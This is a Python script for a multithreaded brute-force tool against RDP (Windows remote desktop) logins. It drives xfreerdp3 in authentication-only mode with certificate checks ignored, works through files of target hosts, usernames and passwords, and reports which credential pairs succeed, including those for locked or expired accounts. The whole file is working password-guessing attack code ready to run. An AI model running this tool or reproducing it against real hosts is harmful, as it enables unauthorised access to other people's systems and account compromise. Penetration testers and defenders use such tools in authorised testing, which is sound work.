#!/usr/bin/env python3

try:
    import os
    import re
    import sys
    import shlex
    import argparse
    import subprocess
    sys.path.insert(0, '/usr/local/bin/rdpbrute3_scripts')
    from threadpool import ThreadPool
    from exceptions import rdpExceptions
except Exception as err:
    from exceptions import rdpExceptions
    raise rdpExceptions(str(err))
class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'
    def disable(self):
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.ENDC = ''
class rdpbruteforce:
    def __init__(self):
        self.xfreerdp3_path = "/usr/bin/xfreerdp3"
        self.rdp_success = "Authentication only, exit status 1"
        self.rdp_success_ins_priv = "insufficient access privileges"
        self.rdp_success_account_locked = "alert internal error"
        self.rdp_error_host_down = "Authentication only, exit status 0"
        self.rdp_error_display = r"Please check that the \$DISPLAY environment variable is properly set."
        description = "rdpbruteforce is a brute force tool which supports guessing the usernames and passwords for a host's rdp login using xfreerdp3."
        usage = "Usage: use --help for further information"
        self.parser = argparse.ArgumentParser(description=description, usage=usage)
        self.is_success = 0
        self.successes = []
    def main(self):
        hosts = self.parser.add_mutually_exclusive_group(required=True)
        usernames = self.parser.add_mutually_exclusive_group(required=True)
        passwords = self.parser.add_mutually_exclusive_group(required=True)
        hosts.add_argument('-ho', '--host', dest='host', action='store', help='Target IP address')
        hosts.add_argument('-H', '--hosts', dest='hosts_file', action='store', help='Multiple targets stored in a file')
        usernames.add_argument('-u', '--username', dest='username', action='store', help='Static name to login with')
        usernames.add_argument('-U', '--usernamefile', dest='username_file', action='store', help='Multiple names to login with, stored in a file')
        self.parser.add_argument('-n', '--number', dest='thread', action='store', help='Number of threads to be active at once', default=5, type=int)
        passwords.add_argument('-p', '--passwd', dest='passwd', action='store', help='Static password to login with')
        passwords.add_argument('-P', '--passwdfile', dest='passwd_file', action='store', help='Multiple passwords to login with, stored in a file', metavar='FILE')
        self.parser.add_argument('-i', '--port', dest='port', action='store', help='Alter the port if the service is not using the default value', type=int)
        self.parser.add_argument('-q', '--quiet', dest='quiet', action='store_true', help='Only display successful logins', default=False)
        try:
            self.args = self.parser.parse_args()
        except Exception as err:
            raise rdpExceptions(str(err))
    def rdplogin(self, ip, user, password, port):
        rdp_cmd = "%s /v:%s /port:%s /u:%s /p:%s /cert:ignore +auth-only " % (self.xfreerdp3_path, ip, port, user, password)
        proc = subprocess.Popen(shlex.split(rdp_cmd), shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        if not self.args.quiet:
             print("Attempt: " + ip + ":" + str(port) + " - " + user + ":" + password)
        for line in proc.stdout:
            if re.search(self.rdp_success, str(line)):
                result = bcolors.OKGREEN + "RDP-SUCCESS : " + bcolors.ENDC + bcolors.OKBLUE + ip + ":" + str(port) + " - " + user + ":" + password + bcolors.ENDC
                self.is_success = 1
                self.successes.append(result)
                print(result)
                break
            elif re.search(self.rdp_success_ins_priv, str(line)):
                result = bcolors.OKGREEN + "RDP-SUCCESS (INSUFFICIENT PRIVILEGES) : " + bcolors.ENDC + bcolors.OKBLUE + ip + ":" + str(port) + " - " + user + ":" + password + bcolors.ENDC
                self.is_success = 1
                self.successes.append(result)
                print(result)
                break
            elif re.search(self.rdp_success_account_locked, str(line)):
                result = bcolors.OKGREEN + "RDP-SUCCESS (ACCOUNT_LOCKED_OR_PASSWORD_EXPIRED) : " + bcolors.ENDC + bcolors.OKBLUE + ip + ":" + str(port) + " - " + user + ":" + password + bcolors.ENDC
                self.is_success = 1
                self.successes.append(result)
                print(result)
                break
            elif re.search(self.rdp_error_display, str(line)):
                mess = r"Please check \$DISPLAY is properly set. See README.md"
                raise rdpExceptions(mess)
            elif re.search(self.rdp_error_host_down, str(line)):
                mess = "Host isn't up"
                raise rdpExceptions(mess)
    def rdp(self):
        port = 3389
        if not os.path.exists(self.xfreerdp3_path):
            mess = "xfreerdp: %s path doesn't exists on the system" % os.path.abspath(self.xfreerdp3_path)
            raise rdpExceptions(mess)
        if self.args.port is not None:
            port = self.args.port
        try:
            pool = ThreadPool(int(self.args.thread))
        except Exception as err:
            raise rdpExceptions(str(err))
        if self.args.username_file:
            if not os.path.exists(self.args.username_file):
                mess = "File: %s doesn't exists ~ %s" % (os.path.abspath(self.args.username_file), self.args.username_file)
                raise rdpExceptions(mess)
        if self.args.passwd_file:
            if not os.path.exists(self.args.passwd_file):
                mess = "File: %s doesn't exists ~ %s" % (os.path.abspath(self.args.passwd_file), self.args.passwd_file)
                raise rdpExceptions(mess)
        if self.args.hosts_file:
            if not os.path.exists(self.args.hosts_file):
                mess = "File: %s doesn't exist ~ %s" % (os.path.abspath(self.args.hosts_file), self.args.hosts_file)
                raise rdpExceptions(mess)
            hostsfile = open(self.args.hosts_file, "r").read().splitlines()
            for ip in hostsfile:
                if not self.args.quiet:
                    print("Trying %s:%s" % (ip, port))
                if self.args.username_file:
                    try:
                        userfile = open(self.args.username_file, "r").read().splitlines()
                    except Exception as err:
                        mess = "Error: %s" % err
                        raise rdpExceptions(mess)
                    for user in userfile:
                        if ' ' in user:
                            user = '"' + user + '"'
                        if self.args.passwd_file:
                            try:
                                passwdfile = open(self.args.passwd_file, "r").read().splitlines()
                            except Exception as err:
                                mess = "Error: %s" % err
                                raise rdpExceptions(mess)
                            for password in passwdfile:
                                pool.add_task(self.rdplogin, ip, user, password, port)
                        else:
                            pool.add_task(self.rdplogin, ip, user, self.args.passwd, port)
                else:
                    if self.args.passwd_file:
                        try:
                            passwdfile = open(self.args.passwd_file, "r").read().splitlines()
                        except Exception as err:
                            mess = "Error: %s" % err
                            raise rdpExceptions(mess)
                        for password in passwdfile:
                            pool.add_task(self.rdplogin, ip, self.args.username, password, port)
                    else:
                        pool.add_task(self.rdplogin, ip, self.args.username, self.args.passwd, port)
        else:
            if not self.args.quiet:
                print("Trying %s:%s" % (self.args.host, port))
            if self.args.username_file:
                try:
                    userfile = open(self.args.username_file, "r").read().splitlines()
                except Exception as err:
                    mess = "Error: %s" % err
                    raise rdpExceptions(mess)
                for user in userfile:
                    if ' ' in user:
                        user = '"' + user + '"'
                    if self.args.passwd_file:
                        try:
                            passwdfile = open(self.args.passwd_file, "r").read().splitlines()
                        except Exception as err:
                            mess = "Error: %s" % err
                            raise rdpExceptions(mess)
                        for password in passwdfile:
                            pool.add_task(self.rdplogin, self.args.host, user, password, port)
                    else:
                        pool.add_task(self.rdplogin, self.args.host, user, self.args.passwd, port)
            else:
                if self.args.passwd_file:
                    try:
                        passwdfile = open(self.args.passwd_file, "r").read().splitlines()
                    except Exception as err:
                        mess = "Error: %s" % err
                        raise rdpExceptions(mess)
                    for password in passwdfile:
                        pool.add_task(self.rdplogin, self.args.host, self.args.username, password, port)
                else:
                    pool.add_task(self.rdplogin, self.args.host, self.args.username, self.args.passwd, port)
        pool.wait_completion()
    def run(self):
        self.main()
        self.rdp()
        if self.is_success == 0:
            print("No results found...")
        else:
            for success in self.successes:
                print(success)
session = rdpbruteforce()
session.run()
